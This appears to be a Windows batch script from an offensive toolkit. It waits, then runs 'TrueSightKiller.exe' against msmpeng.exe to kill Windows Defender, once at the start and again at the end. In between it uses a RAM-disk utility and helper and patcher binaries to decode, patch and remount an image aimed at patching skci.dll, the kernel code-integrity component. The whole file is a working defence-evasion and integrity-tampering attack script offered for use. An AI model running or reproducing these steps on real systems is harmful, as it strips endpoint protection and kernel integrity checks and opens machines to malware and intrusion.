@echo off

cd C:\Scripts

TIMEOUT /T 60

echo [+] Attempting to Disable Windows Defender 
TrueSightKiller.exe -n msmpeng.exe

echo [+] Initializing aliased memory for skci patch

rxprd im enable -n -rsvd 28 -q 5 -s

echo [+] Patching skci.dll 

rxprd add -n 3 -t DIO -v -i -fs FAT -l RAMDISK -F flat -s
rxprd save 0 -a C:\Scripts\mini.vdf -F FLAT -s 
rxprd del 0 -s

helper.exe mini.vdf mini_decoded.vdf
patcher_camera_ready.exe mini_decoded.vdf 0 1 2 3 4 5
helper.exe patched_output.bin mini_patched.vdf 

rxprd add -n 3 -t DIO -v -i -fs FAT -l RAMDISK -F flat -image C:\Scripts\mini_patched.vdf -s
rxprd del 0 -s 

echo [+] Attempting to Disable Windows Defender 
TrueSightKiller.exe -n msmpeng.exe

pause
